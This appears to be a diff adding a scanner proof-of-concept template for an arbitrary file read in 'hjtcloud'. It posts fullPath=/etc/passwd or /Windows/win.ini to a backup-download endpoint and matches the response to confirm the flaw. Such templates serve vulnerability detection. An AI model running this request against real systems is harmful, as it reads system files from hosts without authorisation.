@@ -1,0 +1,23 @@
+name: poc-yaml-hjtcloud-arbitrary-file-read
+groups:
+  Linux:
+    - method: POST
+      path: /fileDownload?action=downloadBackupFile
+      follow_redirects: false
+      body: |
+        fullPath=/etc/passwd
+      expression: |
+        response.status == 200 && "root".bmatches(response.body)
+  Windows:
+    - method: POST
+      path: /fileDownload?action=downloadBackupFile
+      follow_redirects: false
+      body: |
+        fullPath=/Windows/win.ini
+      expression: |
+        response.status == 200 && "extensions".bmatches(response.body)
+
+detail:
+  author: Print1n(http://print1n.top)
+  links:
+    - https://mp.weixin.qq.com/s/w2pkj5ADN7b5uxe-wmfGbw
